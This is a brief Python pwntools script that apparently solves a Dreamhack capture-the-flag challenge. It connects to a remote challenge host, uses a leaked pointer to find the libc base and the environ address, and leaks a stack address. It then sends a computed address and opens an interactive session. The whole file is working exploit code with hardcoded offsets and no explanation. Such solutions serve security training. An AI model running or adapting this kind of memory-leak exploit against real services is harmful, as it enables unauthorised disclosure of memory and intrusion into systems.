from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 13685
r = remote(HOST, PORT)

r.recvuntil(b': ')
libc = int(r.recvline().strip().decode(), 16) - 0x21a780
environ = libc + 0x221200

r.sendlineafter(b'> ', b'1')
r.sendlineafter(b': ', str(environ).encode())
leak = u64(r.recvuntil(b'>').strip(b'>').ljust(8, b'\x00'))

r.sendline(b'1')
r.sendlineafter(b': ', str(leak-0x1568).encode())

r.interactive()